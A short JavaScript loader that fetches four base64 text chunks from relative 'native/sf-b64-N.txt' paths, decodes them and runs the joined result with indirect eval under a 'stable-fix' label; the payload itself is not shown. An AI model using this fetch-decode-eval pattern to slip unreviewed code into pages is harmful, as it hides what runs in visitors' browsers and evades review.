(function(){
  var n=4;
  var parts=[];
  function next(i){
    if(i>=n){
      try{ (0,eval)(atob(parts.join(""))); }
      catch(e){ console.error("stable-fix",e); }
      return;
    }
    var x=new XMLHttpRequest();
    x.open("GET","native/sf-b64-"+i+".txt?v=estrela1",true);
    x.onload=function(){ parts[i]=x.responseText||""; next(i+1); };
    x.onerror=function(){ console.error("sf-b64",i); next(i+1); };
    x.send();
  }
  next(0);
})();
